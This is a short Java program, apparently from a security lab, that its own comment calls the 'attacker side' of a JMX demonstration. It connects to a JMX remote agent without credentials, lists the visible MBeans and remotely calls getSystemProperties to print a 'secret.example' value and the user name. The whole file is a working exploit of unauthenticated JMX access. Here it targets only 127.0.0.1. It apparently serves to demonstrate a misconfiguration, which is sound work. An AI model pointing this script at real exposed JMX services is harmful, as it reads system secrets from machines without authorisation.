package lab;

import java.util.Set;
import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

/**
 * Attacker side of the JMX impact: connects to the victim's JMX remote agent without
 * credentials and reads the victim's JVM state.
 */
public final class JmxProbe {

    public static void main(final String[] args) throws Exception {
        final int port = args.length > 0 ? Integer.parseInt(args[0]) : 10990;
        final JMXServiceURL url =
                new JMXServiceURL("service:jmx:rmi:///jndi/rmi://127.0.0.1:" + port + "/jmxrmi");
        try (JMXConnector connector = JMXConnectorFactory.connect(url, null)) {
            final MBeanServerConnection mbsc = connector.getMBeanServerConnection();
            final Set<ObjectName> names = mbsc.queryNames(new ObjectName("*:*"), null);
            System.out.println("[jmx-probe] connected WITHOUT credentials to " + url);
            System.out.println("[jmx-probe] mbeans visible: " + names.size());
            for (int i = 0; i < Math.min(names.size(), 12); i++) {
                System.out.println("[jmx-probe]   " + names.toArray()[i]);
            }
            final Object sysProps =
                    mbsc.invoke(new ObjectName("java.lang:type=Runtime"), "getSystemProperties", new Object[0], new String[0]);
            @SuppressWarnings("unchecked")
            final java.util.Map<String, String> map = (java.util.Map<String, String>) sysProps;
            System.out.println("[jmx-probe] victim JVM system properties read remotely: " + map.size() + " entries");
            System.out.println("[jmx-probe]   secret.example = " + map.get("secret.example"));
            System.out.println("[jmx-probe]   user.name      = " + map.get("user.name"));
        }
    }

    private JmxProbe() {}
}
